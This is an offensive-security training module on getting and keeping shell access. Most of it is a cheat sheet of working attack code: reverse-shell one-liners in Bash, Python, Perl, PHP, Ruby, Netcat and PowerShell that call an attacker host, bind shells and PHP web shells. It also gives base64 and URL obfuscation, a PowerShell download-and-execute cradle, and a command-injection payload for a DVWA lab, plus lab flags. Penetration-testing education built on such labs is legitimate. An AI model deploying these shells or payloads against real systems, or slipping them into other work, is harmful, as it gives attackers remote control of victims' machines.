# Shell Techniques

Master obtaining and maintaining shell access on target systems - the foundation of post-exploitation.

## Overview

A shell provides command-line access to a system. After gaining initial access through exploitation, you need to establish a reliable shell for further operations.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                           SHELL TYPES COMPARISON                            │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│   REVERSE SHELL                    BIND SHELL                               │
│   ┌──────────┐                     ┌──────────┐                             │
│   │  Target  │ ──connects──►       │  Target  │ ◄──connects──               │
│   │  System  │                     │  (Listens)│                            │
│   └──────────┘                     └──────────┘                             │
│        │                                 ▲                                  │
│        ▼                                 │                                  │
│   ┌──────────┐                     ┌──────────┐                             │
│   │ Attacker │                     │ Attacker │                             │
│   │ (Listens)│                     │  System  │                             │
│   └──────────┘                     └──────────┘                             │
│                                                                             │
│   Best for:                        Best for:                                │
│   - Bypassing firewalls           - When target allows inbound              │
│   - NAT traversal                 - Persistent backdoors                    │
│   - Most common approach          - When attacker can't receive             │
│                                                                             │
│   WEB SHELL                                                                 │
│   ┌──────────┐     HTTP Request    ┌──────────┐                             │
│   │ Attacker │ ──────────────────► │  Target  │                             │
│   │ Browser  │ ◄────────────────── │ Web Shell│                             │
│   └──────────┘     HTTP Response   └──────────┘                             │
│                                                                             │
│   Best for: When only web traffic is allowed                                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

## Learning Objectives

By completing this section, you will be able to:

- Set up and catch reverse shells using various listeners
- Create reverse shells in multiple programming languages
- Deploy bind shells on target systems
- Upload and interact with web shells
- Stabilize and upgrade dumb shells to full TTY
- Encode shells to bypass basic detection

## Labs

| Lab | Topic | Difficulty | Duration |
|-----|-------|------------|----------|
| 1 | Reverse Shell Fundamentals | Intermediate | 45 min |
| 2 | Bind Shell Techniques | Intermediate | 30 min |
| 3 | Web Shell Deployment | Intermediate | 45 min |
| 4 | Shell Stabilization | Intermediate | 30 min |
| 5 | Encoded and Encrypted Shells | Advanced | 1 hr |

---

## Reverse Shells

### Setting Up Listeners

Before sending a reverse shell, you need a listener to catch it.

```bash
# Netcat listener (most common)
nc -lvnp 4444

# Explanation of flags:
# -l = listen mode
# -v = verbose
# -n = no DNS resolution
# -p = port

# Netcat with rlwrap (command history)
rlwrap nc -lvnp 4444

# Socat listener (more features)
socat TCP-LISTEN:4444,reuseaddr,fork EXEC:/bin/bash

# Pwncat listener (auto-upgrade shells)
pwncat-cs -lp 4444

# Metasploit multi/handler
msfconsole -q
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST 0.0.0.0
set LPORT 4444
run
```

### Reverse Shell One-Liners

#### Bash

```bash
# Standard bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# Alternative with exec
exec 5<>/dev/tcp/ATTACKER_IP/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# With named pipe
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f
```

#### Python

```python
# Python 3 reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Python 2 (legacy systems)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

#### Perl

```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### PHP

```php
# PHP reverse shell
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# Longer version with more reliability
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'
```

#### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### Netcat

```bash
# Traditional netcat (with -e flag)
nc -e /bin/sh ATTACKER_IP 4444

# OpenBSD netcat (no -e)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# Netcat with GAPING_SECURITY_HOLE
nc ATTACKER_IP 4444 -e /bin/bash
```

#### PowerShell (Windows)

```powershell
# PowerShell reverse shell
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()

# One-liner encoded version
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback + 'PS ' + (pwd).Path + '> ');$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

---

## Bind Shells

Bind shells listen on the target and wait for incoming connections.

### Creating Bind Shells

```bash
# Netcat bind shell (target)
nc -lvnp 4444 -e /bin/bash

# OpenBSD netcat bind shell
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc -lvnp 4444 > /tmp/f

# Python bind shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1);s.bind(("0.0.0.0",4444));s.listen(1);(conn,addr)=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### Connecting to Bind Shells

```bash
# From attacker machine
nc TARGET_IP 4444

# With Ncat (SSL support)
ncat TARGET_IP 4444

# With Socat
socat TCP:TARGET_IP:4444 -
```

---

## Web Shells

Web shells are scripts that provide command execution via web requests.

### PHP Web Shells

```php
<?php
// Simple one-liner
echo shell_exec($_GET['cmd']);
?>

// Slightly better version
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
}
?>

// With password protection
<?php
$password = "secret";
if($_GET['pass'] !== $password) die("Access denied");
echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
?>
```

### Using Web Shells

```bash
# Execute commands via URL
curl "http://target.com/shell.php?cmd=id"
curl "http://target.com/shell.php?cmd=cat%20/etc/passwd"

# Get reverse shell from web shell
curl "http://target.com/shell.php?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'"
```

### Pre-built Web Shells

```bash
# Locate web shells on Kali
locate webshell
ls /usr/share/webshells/

# Popular options:
# - /usr/share/webshells/php/php-reverse-shell.php
# - /usr/share/webshells/php/simple-backdoor.php
# - /usr/share/webshells/aspx/cmdasp.aspx
```

---

## Shell Stabilization

Raw shells are unstable and lack features. Here's how to upgrade them.

### Full TTY Upgrade (Python Method)

```bash
# Step 1: Spawn a PTY
python3 -c 'import pty;pty.spawn("/bin/bash")'

# Step 2: Background the shell
# Press Ctrl+Z

# Step 3: On attacker machine, configure terminal
stty raw -echo; fg

# Step 4: Set environment (in the shell)
export TERM=xterm
export SHELL=/bin/bash

# Step 5: Fix terminal size (optional)
# On attacker machine (new terminal): stty size
stty rows 38 columns 116
```

### Alternative Upgrade Methods

```bash
# Using script
script /dev/null -c bash

# Using socat (if available on target)
# Attacker:
socat file:`tty`,raw,echo=0 TCP-LISTEN:4444

# Target:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane TCP:ATTACKER_IP:4444

# Using rlwrap on listener
rlwrap nc -lvnp 4444
```

### Troubleshooting Shell Issues

```bash
# If Ctrl+C kills your shell
stty raw -echo; fg

# If terminal size is wrong
stty rows 38 columns 116

# If backspace doesn't work
export TERM=xterm
stty sane

# If shell hangs
# Kill the process on attacker side and restart
```

---

## Shell Encoding and Obfuscation

### Base64 Encoding

```bash
# Encode command
echo 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1' | base64

# Execute encoded payload
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xMC4xMC80NDQ0IDA+JjE= | base64 -d | bash
```

### URL Encoding

```bash
# URL encode for web injection
# bash -i >& /dev/tcp/10.10.10.10/4444 0>&1
# becomes:
bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.10.10%2F4444%200%3E%261
```

### PowerShell Encoding

```powershell
# Encode PowerShell command
$command = 'IEX(New-Object Net.WebClient).DownloadString("http://ATTACKER_IP/shell.ps1")'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encodedCommand = [Convert]::ToBase64String($bytes)

# Execute encoded command
powershell -EncodedCommand $encodedCommand
```

---

## Practice with CyberLab

### Exercise 1: Catch a Reverse Shell

```bash
# Terminal 1: Start listener
nc -lvnp 4444

# Terminal 2: Simulate target sending shell (in Docker)
docker exec -it lab-dvwa bash -c 'bash -i >& /dev/tcp/172.20.0.1/4444 0>&1'
```

### Exercise 2: Command Injection to Shell

```bash
# 1. Access DVWA
# http://localhost:8081
# Login: admin/password
# Set Security Level: Low

# 2. Navigate to Command Injection

# 3. Inject reverse shell
# In the ping field, enter:
; bash -c 'bash -i >& /dev/tcp/YOUR_IP/4444 0>&1'

# 4. Catch on your listener
nc -lvnp 4444
```

### Exercise 3: Shell Stabilization Practice

```bash
# 1. Get a basic shell from any target
# 2. Practice full TTY upgrade
# 3. Test features: tab completion, arrow keys, Ctrl+C handling
```

---

## Flags

| Lab | Flag |
|-----|------|
| Reverse Shell | FLAG{r3v3rs3_sh3ll_pwn3d} |
| Shell Stabilization | FLAG{st4bl3_tty_sh3ll} |
| Web Shell | FLAG{w3b_sh3ll_d3pl0y3d} |

---

## Quick Reference

### Listener Commands

| Tool | Command |
|------|---------|
| Netcat | `nc -lvnp 4444` |
| Netcat (rlwrap) | `rlwrap nc -lvnp 4444` |
| Socat | `socat TCP-LISTEN:4444,reuseaddr -` |
| Pwncat | `pwncat-cs -lp 4444` |
| Metasploit | `use exploit/multi/handler` |

### Shell Generators

- [RevShells.com](https://www.revshells.com/) - Generate reverse shell payloads
- [Pentest Monkey Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)

---

**Previous:** [01 - Enumeration](../01-enumeration/) | **Next:** [03 - Privilege Escalation](../03-privilege-escalation/)
